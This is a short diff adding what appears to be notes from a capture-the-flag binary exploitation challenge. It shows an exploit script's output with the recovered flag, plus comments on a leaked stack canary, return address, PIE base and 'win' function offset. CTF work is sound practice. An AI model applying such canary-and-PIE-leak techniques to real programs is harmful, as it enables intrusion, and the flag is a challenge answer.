@@ -1,0 +1,6 @@
+$ python3 exploit.py
+attempt 0 -> L3AK{s3Arch_f0r_Sm0otH}
+FLAG: L3AK{s3Arch_f0r_Sm0otH}
+
+# Sample leak (one connection): canary=0x81ecbf3f8c044400 (LSB 0x00),
+# ret=0x594653ba9a9b (ret&0xfff == 0xa9b == 0x1a9b&0xfff), pie=ret-0x1a9b, win=pie+0x1289.
